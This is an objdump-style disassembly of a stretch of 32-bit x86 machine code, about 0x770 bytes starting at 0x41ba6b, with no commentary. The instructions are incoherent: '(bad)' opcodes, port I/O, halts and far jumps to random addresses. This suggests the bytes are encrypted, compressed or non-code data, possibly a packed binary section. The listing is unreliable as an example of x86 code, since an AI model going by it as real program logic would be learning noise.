  41ba6b:	(bad)  [edx]
  41ba6d:	sbb    ecx,ebp
  41ba6f:	outs   dx,BYTE PTR ds:[esi]
  41ba70:	lods   eax,DWORD PTR ds:[esi]
  41ba71:	(bad)  
  41ba73:	or     dh,ah
  41ba75:	std    
  41ba76:	lahf   
  41ba77:	mov    bh,0x66
  41ba79:	(bad)
  41ba7c:	imul   esp,DWORD PTR [edi+0x69],0x78463bd5
  41ba83:	out    dx,al
  41ba84:	lods   eax,DWORD PTR ds:[esi]
  41ba85:	add    al,0x83
  41ba87:	daa    
  41ba88:	mov    bh,0xae
  41ba8a:	fisttp QWORD PTR [eax]
  41ba8c:	adc    BYTE PTR [edx+ebx*8],bl
  41ba8f:	imul   BYTE PTR [eax+edi*1]
  41ba92:	mov    ?,esi
  41ba94:	sbb    edi,edx
  41ba96:	or     BYTE PTR [edi+ebp*1-0x10302b9d],0x55
  41ba9e:	jb     0x41ba63
  41baa0:	in     eax,0xb
  41baa2:	lds    ebp,FWORD PTR [edx-0x2ace9bfd]
  41baa8:	xchg   esi,eax
  41baa9:	hlt    
  41baaa:	arpl   WORD PTR fs:[eax-0x79414a2e],bx
  41bab1:	push   0x55
  41bab3:	gs inc eax
  41bab5:	cmp    DWORD PTR [ecx-0x2ce6c2f3],ebp
  41babb:	leave  
  41babc:	sub    DWORD PTR [eax-0x335124e6],edx
  41bac2:	mov    edi,0xc64bb65
  41bac7:	xchg   edi,eax
  41bac8:	jmp    0xd808ca40
  41bacd:	inc    edx
  41bace:	aaa    
  41bacf:	inc    edi
  41bad0:	and    eax,0x7d5eac07
  41bad5:	pop    ds
  41bad6:	mov    cl,0x3
  41bad8:	push   es
  41bad9:	test   eax,0x9238d7fb
  41bade:	xchg   edx,eax
  41badf:	stc    
  41bae0:	cdq    
  41bae1:	sbb    eax,DWORD PTR [esi+0x7d]
  41bae4:	shr    esp,1
  41bae6:	jb     0x41bb63
  41bae8:	and    al,0xb9
  41baea:	rep outs dx,DWORD PTR ds:[esi]
  41baec:	mov    edi,0xc6a39b52
  41baf1:	dec    ecx
  41baf2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41baf3:	or     DWORD PTR [ecx-0x29],ebx
  41baf6:	adc    al,0x20
  41baf8:	inc    eax
  41baf9:	daa    
  41bafa:	clc    
  41bafb:	scas   al,BYTE PTR es:[edi]
  41bafc:	fs cdq 
  41bafe:	aas    
  41baff:	cli    
  41bb00:	ret    0xd362
  41bb03:	cmp    bh,0x65
  41bb06:	push   ecx
  41bb07:	repnz ror DWORD PTR [ecx],cl
  41bb0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb0b:	sbb    eax,0xaf4726c2
  41bb10:	scas   eax,DWORD PTR es:[edi]
  41bb11:	jo     0x41bb53
  41bb13:	scas   eax,DWORD PTR es:[edi]
  41bb14:	mov    ecx,0xc1a675a8
  41bb19:	inc    edi
  41bb1a:	in     al,dx
  41bb1b:	push   ds
  41bb1c:	mov    al,ds:0xafdd2016
  41bb21:	sbb    eax,0xad3726f0
  41bb26:	outs   dx,BYTE PTR ds:[esi]
  41bb27:	add    al,0xb8
  41bb29:	sub    ch,cl
  41bb2b:	scas   al,BYTE PTR es:[edi]
  41bb2c:	aad    0x9c
  41bb2e:	dec    ecx
  41bb2f:	pushf  
  41bb30:	cdq    
  41bb31:	pop    eax
  41bb32:	retf   0x7bec
  41bb35:	test   esi,eax
  41bb37:	push   edi
  41bb38:	mov    dl,0x11
  41bb3a:	push   ebp
  41bb3b:	call   0x2f7a96fa
  41bb40:	dec    edx
  41bb41:	icebp  
  41bb42:	call   0xa74f4577
  41bb47:	test   eax,0x2c9a631f
  41bb4c:	das    
  41bb4d:	sbb    DWORD PTR ds:0x53827bcc,esi
  41bb53:	sbb    al,0xe9
  41bb55:	dec    esi
  41bb56:	pop    edi
  41bb57:	outs   dx,DWORD PTR ds:[esi]
  41bb59:	dec    esi
  41bb5a:	aad    0x30
  41bb5c:	cmc    
  41bb5d:	adc    dh,BYTE PTR [edi]
  41bb5f:	fs mov ebx,gs
  41bb62:	or     bh,BYTE PTR [edx+0x38]
  41bb65:	stos   DWORD PTR es:[edi],eax
  41bb66:	push   esi
  41bb67:	jg     0x41bb78
  41bb69:	stos   BYTE PTR es:[edi],al
  41bb6a:	sbb    DWORD PTR [edx+0x4bdf9acf],ebx
  41bb70:	es jmp 0xc8fd99e0
  41bb76:	jmp    0xfd07e12
  41bb7b:	xor    esp,0x44204731
  41bb81:	ss ret 0x2d44
  41bb85:	push   ss
  41bb86:	push   cs
  41bb87:	and    al,0x12
  41bb89:	inc    edi
  41bb8a:	jecxz  0x41bbda
  41bb8c:	adc    DWORD PTR [edx-0x13608c99],0x7d
  41bb93:	inc    ecx
  41bb94:	arpl   WORD PTR [ecx-0x36fa29b3],bp
  41bb9a:	push   ebx
  41bb9b:	outs   dx,BYTE PTR ds:[esi]
  41bb9c:	xor    eax,0xe86fe686
  41bba1:	fimul  DWORD PTR [esi-0x2e790ab0]
  41bba7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bba8:	sbb    al,0xc6
  41bbaa:	mov    DWORD PTR [ebp-0xf],edx
  41bbad:	dec    ebp
  41bbae:	xor    ah,0xdd
  41bbb1:	xchg   BYTE PTR [ebp+0x12],ch
  41bbb4:	idiv   DWORD PTR [ebp+edx*4+0x53]
  41bbb8:	lds    ebp,FWORD PTR [ecx-0x7257dc38]
  41bbbe:	inc    edx
  41bbbf:	add    eax,0x4753fadb
  41bbc4:	xchg   ebx,eax
  41bbc5:	and    DWORD PTR [esp+eax*4+0x4c],esi
  41bbc9:	aaa    
  41bbca:	sahf   
  41bbcb:	mov    ss:0x1e1c3939,al
  41bbd1:	scas   eax,DWORD PTR es:[edi]
  41bbd2:	xchg   esp,eax
  41bbd3:	and    BYTE PTR [ebp+0xe77cf4e],bh
  41bbd9:	pop    edi
  41bbda:	enter  0xfbed,0xba
  41bbde:	je     0x41bbba
  41bbe0:	jmp    0x8eb4:0xdfdcad2e
  41bbe7:	int    0xe9
  41bbe9:	mov    BYTE PTR [ebp+0x64],dl
  41bbec:	aaa    
  41bbed:	leave  
  41bbee:	sbb    bl,bl
  41bbf0:	les    ebp,FWORD PTR [eax-0x80]
  41bbf3:	call   0x401af471
  41bbf8:	xchg   edx,eax
  41bbf9:	hlt    
  41bbfa:	mov    ebp,0xbbb2d984
  41bbff:	xchg   ecx,eax
  41bc00:	mov    bl,0x41
  41bc02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc03:	inc    esp
  41bc04:	rol    DWORD PTR [ebx-0x5e],cl
  41bc07:	mov    ebx,0x4107020c
  41bc0c:	push   esp
  41bc0d:	fdiv   st,st(0)
  41bc0f:	(bad)  
  41bc10:	retf   
  41bc11:	test   BYTE PTR [eax],dh
  41bc13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc14:	inc    edx
  41bc15:	std    
  41bc16:	add    eax,0xb448d732
  41bc1b:	dec    esi
  41bc1c:	xchg   ebp,eax
  41bc1d:	(bad)
  41bc20:	dec    ecx
  41bc21:	leave  
  41bc22:	mov    eax,0x9cc7244d
  41bc27:	mov    edi,0x6580a926
  41bc2c:	xlat   BYTE PTR ds:[ebx]
  41bc2d:	cmc    
  41bc2e:	cwde   
  41bc2f:	in     al,0xa7
  41bc31:	dec    ebp
  41bc32:	mov    esi,0x3eb01ca3
  41bc37:	es jmp 0xc3b3b2ea
  41bc3d:	popa   
  41bc3e:	push   esi
  41bc3f:	adc    eax,0x1c6e3826
  41bc44:	add    BYTE PTR [eax],al
  41bc46:	and    edi,DWORD PTR [ebx+0x77]
  41bc49:	sbb    al,0x1f
  41bc4b:	jb     0x41bc79
  41bc4d:	ror    BYTE PTR [ecx],1
  41bc4f:	leave  
  41bc50:	gs in  al,dx
  41bc52:	sub    BYTE PTR [ecx-0x6],cl
  41bc55:	retf   0x83db
  41bc58:	stc    
  41bc59:	push   ebx
  41bc5a:	jp     0x41bc45
  41bc5c:	in     eax,dx
  41bc5d:	cmp    eax,0x4d59b5df
  41bc62:	stos   BYTE PTR es:[edi],al
  41bc63:	das    
  41bc64:	cmp    DWORD PTR [esp+eax*2+0x79469b2f],edx
  41bc6b:	cmp    ecx,DWORD PTR [ebp+0x2844f696]
  41bc71:	cmp    ebx,ebx
  41bc73:	jb     0x41bcf0
  41bc75:	jge    0x41bcab
  41bc77:	adc    DWORD PTR [edx],0x5c2c559e
  41bc7d:	aaa    
  41bc7e:	xor    dh,BYTE PTR [ecx+0x55]
  41bc81:	inc    esp
  41bc82:	ror    BYTE PTR [ebp-0x280faa41],cl
  41bc88:	mov    ebp,0x10beaf35
  41bc8d:	stc    
  41bc8e:	out    dx,eax
  41bc8f:	fimul  DWORD PTR [ebp+0x52fea651]
  41bc95:	imul   ebp,DWORD PTR [esp+ebp*4-0x724ba869],0x37fc4298
  41bca0:	mov    dl,0xcb
  41bca2:	rcl    esi,cl
  41bca4:	push   ebx
  41bca5:	repz (bad) [eax+0x34]
  41bca9:	cmp    al,0xc5
  41bcab:	mov    ch,0x1b
  41bcad:	shl    esi,0xb6
  41bcb0:	cmp    BYTE PTR [esi-0x6e],cl
  41bcb3:	call   0xc784:0x5278cfb9
  41bcba:	mov    edx,0xa6a05119
  41bcbf:	xchg   edx,eax
  41bcc0:	loopne 0x41bd31
  41bcc2:	in     al,dx
  41bcc3:	cli    
  41bcc4:	sbb    ah,BYTE PTR ds:0xbfc6446d
  41bcca:	or     al,0x42
  41bccc:	push   0xdf010395
  41bcd1:	loopne 0x41bc55
  41bcd3:	xchg   BYTE PTR [ebx-0x25],ah
  41bcd6:	cs jecxz 0x41bc98
  41bcd9:	out    dx,al
  41bcda:	push   ebp
  41bcdb:	sbb    DWORD PTR [edi-0x5054ced2],edi
  41bce1:	imul   eax,DWORD PTR [edx+ebx*2+0x66],0xffffffdc
  41bce6:	(bad)  
  41bce7:	pusha  
  41bce8:	lods   al,BYTE PTR ds:[esi]
  41bce9:	stos   BYTE PTR es:[edi],al
  41bcea:	cmp    esp,DWORD PTR [edx]
  41bcec:	(bad)  
  41bced:	enter  0x337c,0xe7
  41bcf1:	and    DWORD PTR [edx+0x72849ff1],eax
  41bcf7:	pop    esp
  41bcf8:	in     eax,0xe6
  41bcfa:	stos   DWORD PTR es:[edi],eax
  41bcfb:	mov    edi,0x6b34609a
  41bd00:	pop    DWORD PTR [eax+0x5e]
  41bd03:	das    
  41bd04:	add    eax,0x3e339870
  41bd09:	inc    esp
  41bd0a:	es jp  0x41bd3f
  41bd0d:	jge    0x41bcf2
  41bd0f:	seto   BYTE PTR [edi]
  41bd12:	retf   
  41bd13:	hlt    
  41bd14:	mov    DWORD PTR [esi],ebp
  41bd16:	adc    cl,BYTE PTR [esi+0x107aaac6]
  41bd1c:	cli    
  41bd1d:	xchg   ebp,eax
  41bd1e:	stc    
  41bd1f:	dec    ebx
  41bd20:	les    esp,FWORD PTR [edx]
  41bd22:	xchg   ebp,eax
  41bd23:	jle    0x41bd80
  41bd25:	cmp    edx,DWORD PTR [ecx-0x61]
  41bd28:	outs   dx,BYTE PTR ds:[esi]
  41bd29:	push   ebp
  41bd2a:	(bad)  
  41bd2b:	jo     0x41bccb
  41bd2d:	cmp    bl,bl
  41bd2f:	dec    esi
  41bd30:	loope  0x41bd57
  41bd32:	push   es
  41bd33:	hlt    
  41bd34:	mov    ebx,0x5dd63100
  41bd39:	test   al,0x72
  41bd3b:	and    ecx,edx
  41bd3d:	dec    ebx
  41bd3e:	cmp    eax,0x38109076
  41bd43:	pop    edx
  41bd44:	jl     0x41bcc6
  41bd46:	cmp    al,0x39
  41bd48:	retf   
  41bd49:	mov    ds:0x88482de,eax
  41bd4e:	pop    es
  41bd4f:	clc    
  41bd50:	ret    0xa86
  41bd53:	mov    ecx,0x19b4b54f
  41bd58:	or     DWORD PTR [ebx],ebx
  41bd5a:	aaa    
  41bd5b:	push   0xcf0fe552
  41bd60:	add    esp,ebx
  41bd62:	ret    
  41bd63:	outs   dx,BYTE PTR ds:[esi]
  41bd64:	(bad)  
  41bd65:	sbb    eax,0xfa061f66
  41bd6a:	xor    DWORD PTR [edx-0x653b3c13],esp
  41bd70:	(bad)  
  41bd71:	fs mov eax,edi
  41bd74:	dec    esp
  41bd75:	cli    
  41bd76:	aaa    
  41bd77:	retf   0x1f66
  41bd7a:	xor    ebx,DWORD PTR ds:0x83ee5b5f
  41bd80:	ficomp WORD PTR [esi]
  41bd82:	retf   
  41bd83:	or     DWORD PTR [ebx-0x44],0xa4844cbc
  41bd8a:	cmp    eax,ecx
  41bd8c:	dec    esi
  41bd8d:	das    
  41bd8e:	mov    dl,0x67
  41bd90:	stc    
  41bd91:	or     DWORD PTR [ebx-0x2b],ecx
  41bd94:	mov    WORD PTR [edi-0x2f],es
  41bd97:	int3   
  41bd98:	(bad)
  41bd9c:	in     eax,0x86
  41bd9e:	loope  0x41bd33
  41bda0:	pop    ebp
  41bda1:	pop    ebp
  41bda2:	fcmovu st,st(6)
  41bda4:	in     eax,0xbc
  41bda6:	pop    edx
  41bda7:	addr16 or eax,0x163dc97f
  41bdad:	dec    esi
  41bdae:	rcr    BYTE PTR [edx],cl
  41bdb0:	fstp   TBYTE PTR [edx+0x2]
  41bdb3:	mov    eax,0x722df565
  41bdb8:	sti    
  41bdb9:	mov    ch,0x6b
  41bdbb:	aas    
  41bdbc:	out    dx,al
  41bdbd:	sahf   
  41bdbe:	ins    DWORD PTR es:[edi],dx
  41bdbf:	cdq    
  41bdc0:	fcom   st(6)
  41bdc2:	ins    DWORD PTR es:[edi],dx
  41bdc3:	mov    ebp,0xd2a1810
  41bdc8:	jmp    0x41bdf6
  41bdca:	hlt    
  41bdcb:	sub    BYTE PTR [edx+0x3b67b2dc],dh
  41bdd1:	jle    0x41bd5d
  41bdd3:	cmc    
  41bdd4:	loopne 0x41bd9e
  41bdd6:	fisub  WORD PTR [ebx]
  41bdd8:	aaa    
  41bdd9:	dec    eax
  41bdda:	test   eax,0x2b66230a
  41bddf:	std    
  41bde0:	daa    
  41bde1:	sti    
  41bde2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bde3:	js     0x41bd7c
  41bde5:	sahf   
  41bde6:	je     0x41be0c
  41bde8:	mov    esi,0x1bde3dfe
  41bded:	sti    
  41bdee:	mov    ecx,0xf7a50879
  41bdf3:	aas    
  41bdf4:	out    dx,eax
  41bdf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdf6:	loopne 0x41be51
  41bdf8:	shr    DWORD PTR [edi],0x93
  41bdfb:	aad    0xa5
  41bdfd:	imul   ecx,DWORD PTR [ecx+ebp*8],0x59
  41be01:	retf   0x2e16
  41be04:	lods   al,BYTE PTR ds:[esi]
  41be05:	stos   DWORD PTR es:[edi],eax
  41be06:	data16 cs aaa 
  41be09:	jo     0x41be85
  41be0b:	mov    eax,0x20860ce6
  41be10:	loop   0x41bdd6
  41be12:	push   ecx
  41be13:	icebp  
  41be14:	inc    ebx
  41be15:	mov    esi,0x2f4da124
  41be1a:	das    
  41be1b:	call   0x8490:0x288dc49c
  41be22:	data16 scas al,BYTE PTR es:[edi]
  41be24:	xchg   ebp,eax
  41be25:	pop    esi
  41be26:	shl    dl,cl
  41be28:	rcr    BYTE PTR [edi-0x13753081],1
  41be2e:	adc    dh,BYTE PTR [esi]
  41be30:	jne    0x41be69
  41be32:	das    
  41be33:	dec    DWORD PTR [esi-0x6e7ac5f]
  41be39:	sar    BYTE PTR [edx+0x46],1
  41be3c:	sub    eax,0x9972ae50
  41be41:	call   0xd383:0xe34e3be1
  41be48:	mov    eax,0xe64ed45c
  41be4d:	in     eax,0x2c
  41be4f:	add    DWORD PTR [edx-0x6d],edi
  41be52:	call   0x95281336
  41be57:	push   cs
  41be58:	clc    
  41be59:	push   0x1333ec10
  41be5e:	mov    ch,0x30
  41be60:	retf   0x38d6
  41be63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be64:	ja     0x41be0b
  41be66:	out    dx,al
  41be67:	push   ss
  41be68:	std    
  41be69:	mov    edx,0x5b4f6ea0
  41be6e:	(bad)  
  41be6f:	xchg   edx,eax
  41be70:	les    edi,FWORD PTR [edx-0x45]
  41be73:	or     esi,esi
  41be75:	mov    ds:0xb5c449d3,eax
  41be7a:	or     DWORD PTR [eax],ebx
  41be7c:	addr16 out 0xac,al
  41be7f:	lods   al,BYTE PTR ds:[esi]
  41be80:	loopne 0x41be29
  41be82:	pop    ebx
  41be83:	pop    edx
  41be84:	loop   0x41be2f
  41be86:	leave  
  41be87:	jno    0x41bee3
  41be89:	mov    edx,0x237cae9b
  41be8e:	es sbb eax,0x47c0f8d7
  41be94:	mov    ebp,0xff08fcdf
  41be99:	push   edi
  41be9a:	cmp    DWORD PTR [ebx],eax
  41be9c:	mov    bl,0xe0
  41be9e:	mov    ebx,0x421fec59
  41bea3:	stos   DWORD PTR es:[edi],eax
  41bea4:	dec    esp
  41bea5:	or     ecx,DWORD PTR [edx-0x4cff0bb8]
  41beab:	mov    edx,DWORD PTR [eax-0x80]
  41beae:	sbb    esp,DWORD PTR [esi]
  41beb0:	enter  0x573f,0x46
  41beb4:	stos   DWORD PTR es:[edi],eax
  41beb5:	push   ds
  41beb6:	ret    0x34af
  41beb9:	adc    ebp,ebx
  41bebb:	sbb    eax,0xf020e92
  41bec0:	sub    al,0x8a
  41bec2:	popa   
  41bec3:	test   BYTE PTR [ebp+esi*4-0x22cbdac0],dh
  41beca:	not    ecx
  41becc:	jb     0x41be51
  41bece:	mov    ch,0x3f
  41bed0:	or     BYTE PTR [ebx+0x49ceaf86],dh
  41bed6:	hlt    
  41bed7:	or     ecx,DWORD PTR [ebp+0x9ea2e7]
  41bedd:	into   
  41bede:	or     ah,BYTE PTR [esi-0x708d2cd2]
  41bee4:	push   ebp
  41bee5:	cmp    ebx,DWORD PTR [eax+eax*4-0x7c]
  41bee9:	and    BYTE PTR [ebx+ecx*4],dh
  41beec:	pop    esp
  41beed:	push   0xbe7dd0d
  41bef2:	fs jmp 0x41be89
  41bef5:	hlt    
  41bef6:	sbb    DWORD PTR [esi-0x4d],ecx
  41bef9:	add    al,0x26
  41befb:	mov    bl,0xa5
  41befd:	cs add edx,eax
  41bf00:	jae    0x41be8e
  41bf02:	dec    eax
  41bf03:	dec    eax
  41bf04:	or     dl,al
  41bf06:	push   ebp
  41bf07:	jbe    0x41bf31
  41bf09:	xor    BYTE PTR [edi+0x6e],0x18
  41bf0d:	neg    DWORD PTR [ebx-0x10]
  41bf10:	out    dx,al
  41bf11:	xor    al,0xd
  41bf13:	sub    eax,0xd818bfe7
  41bf18:	fcomp  DWORD PTR [ebp-0x5b677ca7]
  41bf1e:	fdivr  DWORD PTR [ecx+0x50e93518]
  41bf24:	inc    edi
  41bf25:	cmp    al,0xaf
  41bf27:	mov    ch,0x1e
  41bf29:	pop    ss
  41bf2a:	hlt    
  41bf2b:	xchg   esi,eax
  41bf2c:	out    dx,eax
  41bf2d:	addr16 in al,0x5
  41bf30:	ds pusha 
  41bf32:	pop    ecx
  41bf33:	lds    edx,FWORD PTR [edx+eax*2]
  41bf36:	push   es
  41bf37:	pop    edi
  41bf38:	push   ds
  41bf39:	jbe    0x41becd
  41bf3b:	push   edi
  41bf3c:	sbb    ch,BYTE PTR [edi-0x617a4ce2]
  41bf42:	add    edx,DWORD PTR [ebx+0x750288e2]
  41bf48:	jl     0x41bf1b
  41bf4a:	aad    0x1c
  41bf4c:	sbb    eax,0x9e237edc
  41bf51:	sar    BYTE PTR [ecx+0xc],0xca
  41bf55:	in     al,0x8
  41bf57:	out    dx,eax
  41bf58:	nop
  41bf59:	lea    esp,ds:0x722834e9
  41bf5f:	mov    BYTE PTR fs:[ebx+0x5f],dh
  41bf63:	clc    
  41bf64:	sbb    al,0xa7
  41bf66:	push   es
  41bf67:	mov    ah,0xb8
  41bf69:	jo     0x41bef2
  41bf6b:	sti    
  41bf6c:	ins    DWORD PTR es:[edi],dx
  41bf6d:	xrstor [ebp-0x21478b71]
  41bf74:	std    
  41bf75:	push   ds
  41bf76:	adc    ah,BYTE PTR ds:0xcf996ba1
  41bf7c:	push   0xde1cafae
  41bf81:	cli    
  41bf82:	stc    
  41bf83:	rol    DWORD PTR [eax-0x6857d798],1
  41bf89:	mul    DWORD PTR [edi-0x91e7dd]
  41bf8f:	inc    edx
  41bf90:	jmp    0xaf56:0x44dd49e4
  41bf97:	jmp    0x9db93d74
  41bf9c:	push   ss
  41bf9d:	jb     0x41bf98
  41bf9f:	fcom   QWORD PTR [ebx-0x9878e96]
  41bfa5:	mov    eax,0xd69db93c
  41bfaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfab:	inc    edx
  41bfac:	xchg   esi,eax
  41bfad:	sub    BYTE PTR [ebx+0x6c],al
  41bfb0:	lahf   
  41bfb1:	push   eax
  41bfb2:	push   ebx
  41bfb3:	push   eax
  41bfb4:	dec    edx
  41bfb5:	inc    edi
  41bfb6:	imul   ecx,DWORD PTR [eax+0x28319923],0x19
  41bfbd:	push   ss
  41bfbe:	mov    dl,BYTE PTR [esi-0x26877277]
  41bfc4:	pop    ds
  41bfc5:	xor    DWORD PTR [ebx-0x19],ebx
  41bfc8:	aam    0x5d
  41bfca:	(bad)  
  41bfcb:	mov    bl,0xe8
  41bfcd:	fistp  DWORD PTR [edi+0x6379b525]
  41bfd3:	xor    DWORD PTR [edx],0x47
  41bfd6:	xlat   BYTE PTR ds:[ebx]
  41bfd7:	add    bh,BYTE PTR [edi]
  41bfd9:	sbb    ah,dl
  41bfdb:	fmul   DWORD PTR [esi+0x513b07b3]
  41bfe1:	pop    ebx
  41bfe2:	mov    cl,BYTE PTR [esp+edx*1]
  41bfe5:	sub    eax,0xba83ffbc
  41bfea:	mov    DWORD PTR [ebx+0xc6c020b],esi
  41bff0:	mov    bh,0x2c
  41bff2:	ficom  DWORD PTR [edx+ebp*1]
  41bff5:	iret   
  41bff6:	mov    edi,0xa2cb54c0
  41bffb:	xor    edx,DWORD PTR [ebp-0x7c]
  41bffe:	xchg   ebx,eax
  41bfff:	in     al,dx
  41c000:	xor    al,dl
  41c002:	adc    DWORD PTR [ecx+0x4],eax
  41c005:	out    0x1e,al
  41c007:	push   ebp
  41c008:	retf   0x516f
  41c00b:	mov    DWORD PTR [esi-0x27353746],ecx
  41c011:	pop    ds
  41c012:	mov    bl,0xd2
  41c014:	in     eax,0xed
  41c016:	enter  0x3b47,0x58
  41c01a:	inc    ebp
  41c01b:	imul   ebx,DWORD PTR [edx+0x78],0xf6dde600
  41c022:	bound  ebp,QWORD PTR ss:[ecx]
  41c025:	into   
  41c026:	adc    eax,0x36477c08
  41c02b:	push   es
  41c02c:	pushf  
  41c02d:	cdq    
  41c02e:	popf   
  41c02f:	pop    eax
  41c030:	test   BYTE PTR [edi+edx*1-0x540fa0fb],ah
  41c037:	mov    ah,BYTE PTR [edx-0x72]
  41c03a:	fcomp  QWORD PTR [esi]
  41c03c:	jae    0x41c08d
  41c03e:	mov    cl,0xfe
  41c040:	dec    edi
  41c041:	xlat   BYTE PTR ds:[ebx]
  41c042:	dec    eax
  41c043:	(bad)  
  41c044:	ds dec eax
  41c046:	scas   al,BYTE PTR es:[edi]
  41c047:	dec    eax
  41c048:	cld    
  41c049:	jmp    0xa63e7240
  41c04e:	arpl   WORD PTR [ebx-0x3f],bp
  41c051:	scas   eax,DWORD PTR es:[edi]
  41c052:	idiv   BYTE PTR [edi+0x18600dda]
  41c058:	daa    
  41c059:	test   BYTE PTR [esi+0x26065fca],cl
  41c05f:	enter  0x5355,0xdb
  41c063:	add    edi,DWORD PTR [edx]
  41c065:	cmp    DWORD PTR [edx],ebp
  41c067:	jae    0x41c08e
  41c069:	in     al,0xc9
  41c06b:	scas   al,BYTE PTR es:[edi]
  41c06c:	inc    edi
  41c06d:	jmp    0x41c01f
  41c06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c070:	mov    eax,ds:0x9d4b60c9
  41c075:	test   DWORD PTR [edx-0x43],0xd2189603
  41c07c:	hlt    
  41c07d:	not    DWORD PTR [ecx]
  41c07f:	call   0x1ae1:0xc9476a5d
  41c086:	inc    ecx
  41c087:	mov    al,0xdf
  41c089:	fstp   QWORD PTR ss:[ebx+0x1]
  41c08d:	icebp  
  41c08e:	xor    al,0x66
  41c090:	pop    eax
  41c091:	pop    edx
  41c092:	cs jmp 0x41c032
  41c095:	scas   al,BYTE PTR es:[edi]
  41c096:	push   0x76
  41c098:	push   ebp
  41c099:	lds    edx,FWORD PTR [edi+edx*4+0x42e78535]
  41c0a0:	xor    dl,cl
  41c0a2:	fst    DWORD PTR [ecx]
  41c0a4:	mov    esp,0x5bbbb8da
  41c0a9:	push   ecx
  41c0aa:	jge    0x41c0a1
  41c0ac:	ins    BYTE PTR es:[edi],dx
  41c0ad:	mov    ecx,0x81baec1f
  41c0b2:	mov    esp,0x973803c9
  41c0b7:	cli    
  41c0b8:	dec    ecx
  41c0b9:	mov    ebx,0xe025912e
  41c0be:	adc    al,0xf1
  41c0c0:	xchg   BYTE PTR [edi],cl
  41c0c2:	inc    esi
  41c0c3:	xchg   BYTE PTR [ecx+0x5e],al
  41c0c6:	scas   al,BYTE PTR es:[edi]
  41c0c7:	xchg   edi,eax
  41c0c8:	or     eax,0x2e2c886e
  41c0cd:	mov    ecx,0xd059a04
  41c0d2:	(bad)  
  41c0d3:	(bad)  
  41c0d5:	and    ah,BYTE PTR [edi+0x24]
  41c0d8:	ret    
  41c0d9:	nop
  41c0da:	jne    0x41c136
  41c0dc:	push   ss
  41c0dd:	or     eax,0xafe8415
  41c0e2:	(bad)  
  41c0e4:	(bad)  
  41c0e5:	xchg   ecx,eax
  41c0e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0e7:	fist   WORD PTR [ebp+0x5025ae47]
  41c0ed:	test   DWORD PTR ds:0x30070215,edx
  41c0f3:	daa    
  41c0f4:	ins    DWORD PTR es:[edi],dx
  41c0f5:	mov    al,ds:0x78132d2a
  41c0fa:	xchg   esi,eax
  41c0fb:	repz pop ss
  41c0fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0fe:	das    
  41c0ff:	cmp    DWORD PTR [ebp-0x486f69e],ebx
  41c105:	hlt    
  41c106:	aas    
  41c107:	jo     0x41c15e
  41c109:	xchg   esi,eax
  41c10a:	sbb    eax,0x6f4d7695
  41c10f:	add    DWORD PTR [ecx-0x5bbf3997],eax
  41c115:	sub    DWORD PTR ds:0x52259b21,esi
  41c11b:	inc    ebp
  41c11c:	(bad)  
  41c11d:	lods   eax,DWORD PTR ds:[esi]
  41c11e:	(bad)  
  41c120:	push   DWORD PTR ds:0x5d0f6901
  41c126:	stos   DWORD PTR es:[edi],eax
  41c127:	sbb    al,dl
  41c129:	mov    WORD PTR [ecx-0x56eb4002],ds
  41c12f:	test   eax,0xdbfdc7b3
  41c134:	jp     0x41c17c
  41c136:	push   esp
  41c137:	add    edi,DWORD PTR [edi-0x67]
  41c13a:	sahf   
  41c13b:	sbb    ah,bl
  41c13d:	xchg   ebx,eax
  41c13e:	jns    0x41c1a6
  41c140:	nop
  41c141:	mov    ch,0xe3
  41c143:	outs   dx,DWORD PTR ds:[esi]
  41c144:	cmp    BYTE PTR [ebx],ch
  41c146:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c147:	(bad)  
  41c148:	in     eax,dx
  41c149:	fistp  WORD PTR [ebx+0x44]
  41c14c:	jmp    0x41c198
  41c14e:	loop   0x41c0fb
  41c150:	push   es
  41c151:	adc    eax,0xdfd6c374
  41c156:	add    BYTE PTR [eax+0x1e307c73],ch
  41c15c:	jns    0x41c138
  41c15e:	mov    dl,0x33
  41c160:	in     al,dx
  41c161:	xchg   BYTE PTR [esi+0x11],dl
  41c164:	bnd jae 0x41c144
  41c167:	pop    ecx
  41c168:	iret   
  41c169:	mov    dh,0xe8
  41c16b:	mov    al,0x84
  41c16d:	icebp  
  41c16e:	inc    esi
  41c16f:	popf   
  41c170:	imul   ebx,DWORD PTR [ebx-0x78],0xa37931b5
  41c177:	or     ecx,eax
  41c179:	add    ebx,DWORD PTR [eax-0x70]
  41c17c:	mov    dl,0x56
  41c17e:	lds    esp,FWORD PTR [esi+edi*1-0x6714b821]
  41c185:	dec    BYTE PTR [edx-0x5e]
  41c188:	and    BYTE PTR [edx+eax*8-0x62ba55e1],bl
  41c18f:	add    al,0x1e
  41c191:	mov    ch,0xfe
  41c193:	xchg   ecx,eax
  41c194:	enter  0xae8c,0xcf
  41c198:	jg     0x41c18a
  41c19a:	add    eax,0xbd48fa56
  41c19f:	repnz mov ds:0x9ee27782,al
  41c1a5:	repz add DWORD PTR [ebx+0x30251b18],edx
  41c1ac:	loop   0x41c1a7
  41c1ae:	xchg   DWORD PTR [ebp+0x6d],ebp
  41c1b1:	addr16 dec esp
  41c1b3:	icebp  
  41c1b4:	lods   eax,DWORD PTR ds:[esi]
  41c1b5:	mov    bx,WORD PTR [eax+ebp*1]
  41c1b9:	push   eax
  41c1ba:	pusha  
  41c1bb:	jnp    0x41c13f
  41c1bd:	mov    al,0x29
  41c1bf:	pushf  
  41c1c0:	pop    edx
  41c1c1:	test   DWORD PTR [edi],eax
  41c1c3:	pushf  
  41c1c4:	mov    ecx,0xaa457f30
  41c1c9:	clc    
  41c1ca:	(bad)  
  41c1cb:	xchg   esi,eax
  41c1cc:	loopne 0x41c238
  41c1ce:	in     al,0xd4
  41c1d0:	mov    ds:0x8882530b,eax
  41c1d5:	fild   DWORD PTR [ebx-0x2b]
